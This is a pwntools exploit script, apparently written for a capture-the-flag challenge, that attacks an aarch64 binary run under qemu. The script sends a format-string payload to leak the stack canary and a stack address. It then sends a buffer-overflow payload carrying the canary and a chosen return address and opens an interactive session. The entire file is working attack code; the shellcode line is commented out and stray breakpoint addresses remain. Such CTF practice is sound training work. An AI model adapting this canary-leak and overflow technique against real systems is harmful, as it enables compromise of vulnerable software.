from pwn import *
context.log_level = 'debug'
context.arch = "aarch64"
e = context.binary = ELF('chal')
r = process(['qemu-aarch64', '-g', '1111', './chal'])
# r = process(['qemu-aarch64', './chal'])

# r = remote('arm-and-a-leg.gold.b01le.rs', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

main=0x400928 
ret=0x000000000040070c
fget_feedback=0x400BBC
r.sendlineafter(b"2. Legs\n", b"1")
r.sendlineafter(b"king of?\n", b"1337")
r.sendlineafter(b"appendage? ", b"%p-%p-%p-%p-%pCNR:%19$p|SHL:%8$p")
time.sleep(1)
r.recvuntil(b"CNR:0x")
canary = int(r.recv(16),16)

r.recvuntil(b"SHL:0x")
shellland = int(r.recvline().strip(),16)
shellland= shellland+0x20
info("canary: 0x%x", canary)

info("shellland: 0x%x", shellland)

# shell = asm(shellcraft.sh())

# print(shell)
payload = cyclic(104)+flat(canary, 0,0x0000000000400720,0xdeadbeef,canary)
# pause()
print(len(payload))
print((payload))
r.sendlineafter(b"feedback?!\n", payload)

r.interactive()

# b*0x400B58
# b*0x400C0C
0x000000000040091c